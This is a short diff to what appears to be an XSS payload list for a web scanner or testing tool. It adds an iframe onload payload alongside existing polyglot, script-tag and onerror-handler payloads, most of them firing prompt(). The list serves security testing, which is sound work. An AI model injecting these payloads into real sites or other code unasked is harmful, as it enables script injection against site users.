@@ -22,3 +22,4 @@
 '''"'-function(){{{callback}}}()-">\"><scrIpt>{callback}</scrIpt><aUdio src=x oNerror={callback}><"-'-function(){{{callback}}}()"'''
 ";a=prompt,a()//
 "><img src=x onerror=prompt(1);>
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
